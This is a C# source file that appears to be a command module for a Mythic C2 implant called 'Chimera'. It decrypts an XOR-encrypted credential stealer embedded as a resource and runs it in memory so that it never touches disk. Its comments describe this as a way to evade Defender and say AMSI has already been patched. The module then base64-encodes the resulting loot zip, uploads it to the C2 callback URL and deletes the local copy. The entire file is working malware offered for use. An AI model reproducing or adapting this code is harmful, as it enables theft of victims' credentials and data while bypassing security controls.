using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;

namespace Chimera.Commands
{
    // StealerExfil — runs stealer entirely in-memory from the embedded stealer_enc resource.
    // stealer.exe NEVER touches disk — prevents Defender static/behavioral scan.
    // AMSI is already patched by Program.cs before this runs, so Assembly.Load is blind.
    public static class StealerExfil
    {
        private static readonly string LootDir  = @"C:\Users\Public";
        private static readonly byte   XorKey   = 0x41;

        public static string Execute(string taskID, string callbackUUID)
        {
            try
            {
                Directory.CreateDirectory(LootDir);

                // ── 1. Check for an existing zip first (e.g. from a previous run) ──────
                string[] existing = Directory.GetFiles(LootDir, "*.zip");
                if (existing.Length > 0)
                    return UploadZips(existing, taskID, callbackUUID);

                // ── 2. Load stealer from encrypted embedded resource ──────────────────
                byte[] enc = LoadResource("stealer_enc");
                if (enc == null || enc.Length == 0)
                    return "[-] stealer_enc resource not found.";

                // XOR-decrypt
                byte[] decrypted = new byte[enc.Length];
                for (int i = 0; i < enc.Length; i++)
                    decrypted[i] = (byte)(enc[i] ^ XorKey);

                // ── 3. Assembly.Load — runs entirely in CLR memory, no file on disk ───
                Assembly stealer;
                try
                {
                    stealer = Assembly.Load(decrypted);
                }
                catch (Exception ex)
                {
                    return "[-] Assembly.Load failed: " + ex.Message;
                }

                // Capture stdout so stealer output comes back through C2
                var sw  = new StringWriter();
                var old = Console.Out;
                Console.SetOut(sw);

                try
                {
                    MethodInfo entry = FindEntry(stealer);
                    if (entry == null)
                        return "[-] No entry point found in stealer assembly.";

                    object[] args = entry.GetParameters().Length > 0
                        ? new object[] { new string[0] }
                        : null;

                    entry.Invoke(null, args);
                }
                finally
                {
                    Console.SetOut(old);
                }

                // ── 4. Poll for loot zip (stealer writes it to LootDir) ───────────────
                string[] zips = null;
                for (int i = 0; i < 120; i++)
                {
                    Thread.Sleep(1000);
                    zips = Directory.GetFiles(LootDir, "*.zip");
                    if (zips.Length > 0) break;
                }

                if (zips == null || zips.Length == 0)
                    return "[-] Stealer ran but no loot zip found in " + LootDir;

                // ── 5. Upload ─────────────────────────────────────────────────────────
                return UploadZips(zips, taskID, callbackUUID);
            }
            catch (Exception ex)
            {
                return "[-] StealerExfil error: " + ex.Message;
            }
        }

        // ── helpers ───────────────────────────────────────────────────────────────────

        private static string UploadZips(string[] zips, string taskID, string callbackUUID)
        {
            var sb = new StringBuilder();
            foreach (string path in zips)
            {
                try
                {
                    string fname = Path.GetFileName(path);
                    byte[] data  = File.ReadAllBytes(path);
                    string b64   = Convert.ToBase64String(data);

                    string json = string.Format(
                        "{{\"action\":\"post_response\",\"responses\":[{{" +
                        "\"task_id\":\"{0}\"," +
                        "\"download\":{{\"total_chunks\":1,\"chunk_num\":1," +
                        "\"chunk_data\":\"{1}\",\"full_path\":\"{2}\"," +
                        "\"is_screenshot\":false}}}}]}}",
                        taskID, b64, path.Replace("\\", "\\\\"));

                    PostToMythic(json);
                    sb.AppendLine("[+] uploaded: " + fname + " (" + data.Length / 1024 + " KB)");

                    try { File.Delete(path); } catch { }
                }
                catch (Exception ex)
                {
                    sb.AppendLine("[-] " + Path.GetFileName(path) + ": " + ex.Message);
                }
            }
            return sb.ToString().Trim();
        }

        private static byte[] LoadResource(string name)
        {
            try
            {
                var asm = Assembly.GetExecutingAssembly();
                using (Stream s = asm.GetManifestResourceStream(name))
                {
                    if (s == null) return null;
                    var ms = new MemoryStream();
                    s.CopyTo(ms);
                    return ms.ToArray();
                }
            }
            catch { return null; }
        }

        private static MethodInfo FindEntry(Assembly asm)
        {
            foreach (Type t in asm.GetTypes())
            {
                // Try Main(string[]) first, then Main(), then Run()
                MethodInfo m;
                m = t.GetMethod("Main", BindingFlags.Public | BindingFlags.Static,
                    null, new[] { typeof(string[]) }, null);
                if (m != null) return m;

                m = t.GetMethod("Main", BindingFlags.Public | BindingFlags.Static,
                    null, Type.EmptyTypes, null);
                if (m != null) return m;

                m = t.GetMethod("Run", BindingFlags.Public | BindingFlags.Static,
                    null, Type.EmptyTypes, null);
                if (m != null) return m;
            }
            return null;
        }

        private static void PostToMythic(string json)
        {
            try
            {
                byte[] body = Encoding.UTF8.GetBytes(json);
                var wc = new WebClient();
                wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                wc.Headers["User-Agent"] = Config.UserAgent;
                wc.UploadData(Config.CallbackURL, "POST", body);
            }
            catch { }
        }
    }
}
